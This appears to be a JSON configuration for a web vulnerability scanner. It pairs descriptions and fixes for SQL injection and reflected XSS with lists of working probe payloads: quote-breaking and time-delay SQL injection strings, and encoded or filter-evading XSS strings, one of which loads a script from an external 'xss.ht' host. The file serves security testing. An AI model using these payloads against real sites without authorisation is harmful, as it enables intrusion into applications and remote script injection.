{
  "Vulnerability Descriptions":
          [
            {
              "name": "Error-Based SQL Injection",
              "severity": 1,
              "description": "A SQL injection attack consists of insertion or \"injection\" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administrative operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. Error-based injections are exploited through triggering errors in the database when invalid inputs are passed to it. The error messages can be used to retrieve the full query results, or gain information on how to restructure the query for further exploitation.",
              "recommendations": "{\"description\":\"Implement the following solutions:\",\"mitigations\":[\"Validate and verify input existence, length, type and permitted values, and verify logical compliance of any user-controlled input. A whitelist approach for input validation is suggested, rather than a blacklist approach that prevents the usage of certain characters.\",\"Use secure database access methods in the application's development processes. It is recommended to construct and execute queries through the use of Prepared Statements or Stored Procedures. \"]}"
            },
            {
              "name": "RXSS (Reflected Cross-Site Scripting)",
              "severity": 2,
              "description": "A XSS attack allows an attacker to inject a script into the content of a website or an app. When a user visits the infected page, the script will execute in the victim browser. This allows attackers to steal private information like cookies, account information, or to perform custom operations while impersonating the victim. A reflected XSS (RXSS) is a specific type of XSS whose malicious script bounces off of another website to the victim browser. It is passed in the query, typically, in the URL. It makes exploitation as easy as tricking a user to click on a link.",
              "recommendations": "{\"description\":\"Implement the following solutions:\",\"mitigations\":[\"Validate and verify input existence, length, type, permitted values and verify logical compliance of any user-controlled input. A whitelist approach for input validation is suggested, rather than a blacklist approach that prevents the usage of certain characters.\",\"Encode user-controlled output based on the context into which it is being embedded.\",\"Prevent unauthorized user inputs from being embedded into client-side scripts.\",\"sanitize all user input data on the client side.\"]}"
            },
            {
              "name": "Time-Based SQL Injection",
              "severity": 3,
              "description": "A SQL injection attack consists of insertion or \"injection\" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administrative operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. Time-based SQL Injection is a kind of attack that injects a SQL segment which contains specific DBMS function or heavy query that generates a time delay, which helps the attacker infer a possible exploit exists.",
              "recommendations": "{\"description\":\"Implement the following solutions:\",\"mitigations\":[\"Validate and verify input existence, length, type and permitted values, and verify logical compliance of any user-controlled input. A whitelist approach for input validation is suggested, rather than a blacklist approach that prevents the usage of certain characters.\",\"Use secure database access methods in the application's development processes. It is recommended to construct and execute queries through the use of Prepared Statements or Stored Procedures. \"]}"
            },
            {
              "name": "Second-Order SQL Injection (Error Based)",
              "severity": 1,
              "description": "A SQL Injection technique that allows a malicious user to inject a query fragment into a query that is not necessarily vulnerable to SQL injection, and then have that injected SQL query executed in another query that is vulnerable to SQL Injection.",
              "recommendations": "{\"description\":\"Implement the following solutions:\",\"mitigations\":[\"Validate and verify input existence, length, type and permitted values, and verify logical compliance of any user-controlled input. A whitelist approach for input validation is suggested, rather than a blacklist approach that prevents the usage of certain characters.\",\"Use secure database access methods in the application's development processes. It is recommended to construct and execute queries through the use of Prepared Statements or Stored Procedures. \"]}"
            }
          ],
  "SQLI Payloads":
          [
            {
              "payload": "5;;5%27;;5%27%27",
              "type": "error-based"
            },
            {
              "payload": "5;;5%27;;5%00",
              "type": "error-based"
            },
            {
              "payload": "5;;5%27;;6-1",
              "type": "error-based"
            },
            {
              "payload": "5;;5%27;;6%0a-1",
              "type": "error-based"
            },
            {
              "payload": "5;;5%27;;6-%0a1",
              "type": "error-based"
            },
            {
              "payload": "[];;[]%27;;[]%27%27",
              "type": "error-based"
            },
            {
              "payload": "[];;[]%27;;[]`%20%23",
              "type": "error-based"
            },
            {
              "payload": "2;;%27+or+sleep(2)+--+-",
              "type": "time-based"
            },
            {
              "payload": "2;;%27+or+WAIT+FOR+DELAY+%2700:00:02%27+--+-",
              "type": "time-based"
            }
          ],
  "RXSS Payloads":
          [
            {
              "payload": "<script>console.log(123)</script>",
              "expectedResult": "<script>console.log(123)</script>"
            },
            {
              "payload": "eval('console'+'.log(0)');",
              "expectedResult": "eval('console.log(0)'"
            },
            {
              "payload": "<sCrIpt>console.log(1)</ScRipt>",
              "expectedResult": "<sCrIpt>console.log(1)</ScRipt>"
            },
            {
              "payload": "<noscript><p title=\"</noscript><img src=x onerror=console.log(1)>\">",
              "expectedResult": "<img src=x onerror=console.log(1)>"
            },
            {
              "payload": "\"><script src=//yoursubdomain.xss.ht></script>",
              "expectedResult": "<script src=//yoursubdomain.xss.ht></script>"
            },
            {
              "payload": "<div onpointerover=\"console.log(45)\">MOVE HERE</div>",
              "expectedResult": "<div onpointerover=\"console.log(45)\">MOVE HERE</div>"
            },
            {
              "payload": "<img src=x onerror=console.log(String.fromCharCode(88,83,83));>",
              "expectedResult": "<img src=x onerror=console.log"
            },
            {
              "payload": "<scr<script>ipt>console.log('XSS')</scr<script>ipt>",
              "expectedResult": "<script>console.log('XSS')</script>"
            },
            {
              "payload": "\"><script>console.log('XSS')</script>",
              "expectedResult": "<script>console.log('XSS')</script>"
            },
            {
              "payload": "<x>%00%00%00%00%00%00%00<script>console.log(1)</script>",
              "expectedResult": "<script>console.log(1)</script>"
            },
            {
              "payload": "\\');console.log(1);//",
              "expectedResult": "');console.log(1);"
            },
            {
              "payload": "{{constructor.constructor('console.log(1)')()}}",
              "expectedResult": "{{constructor.constructor('console.log(1)')()}}"
            },
            {
              "payload": "%25%33%63%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%65%25%36%33%25%36%66%25%36%65%25%37%33%25%36%66%25%36%63%25%36%35%25%32%65%25%36%63%25%36%66%25%36%37%25%32%38%25%33%31%25%32%39%25%33%63%25%32%66%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%65",
              "expectedResult": "<script>console.log(1)</script>"
            }
          ],
  "Responses":
          [
            {
              "response": "error"
            }
          ]
}